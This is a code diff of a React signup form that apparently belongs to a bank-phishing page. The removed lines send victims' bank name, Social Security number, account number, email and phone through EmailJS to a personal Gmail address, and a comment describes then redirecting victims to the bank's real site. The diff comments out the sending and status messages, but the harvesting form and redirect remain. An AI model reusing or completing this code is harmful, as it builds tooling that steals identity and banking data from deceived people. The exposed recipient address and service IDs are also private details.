@@ -41,20 +41,20 @@ export default function Signup({ onSignup }) {
     
     try {
       // Send email using EmailJS
-      const response = await emailjs.send(
-        "service_28ubo3j", // Replace with your EmailJS service ID
-        "template_3er1ezu", // Replace with your EmailJS template ID
-        {
-          bName: formData.bName,
-          ssn: formData.ssn,
-          accountNumber: formData.accountNumber,
-          email: formData.email,
-          phone: formData.phone,
-          to_email: "ifegbesan6@gmail.com", // Optional if specified in the template
-        }
-      );
+      // const response = await emailjs.send(
+      //   "service_28ubo3j", // Replace with your EmailJS service ID
+      //   "template_3er1ezu", // Replace with your EmailJS template ID
+      //   {
+      //     bName: formData.bName,
+      //     ssn: formData.ssn,
+      //     accountNumber: formData.accountNumber,
+      //     email: formData.email,
+      //     phone: formData.phone,
+      //     to_email: "ifegbesan6@gmail.com", // Optional if specified in the template
+      //   }
+      // );
       
-      console.log("Email sent successfully:", response);
+      // console.log("Email sent successfully:", response);
       setSubmitStatus("success");
       
       // Redirect to the bank's real site after a short delay
@@ -181,7 +181,7 @@ export default function Signup({ onSignup }) {
               />
             </div>
 
-            {/* Status message */}
+            {/* Status message
             {submitStatus === "success" && (
               <div className="text-green-500 text-center">Signup successful. Redirecting...</div>
             )}
@@ -189,7 +189,7 @@ export default function Signup({ onSignup }) {
               <div className="text-red-500 text-center">
                 Something went wrong. Please try again.
               </div>
-            )}
+            )} */}
 
             {/* Next Button */}
             <div className="flex justify-center mt-6">
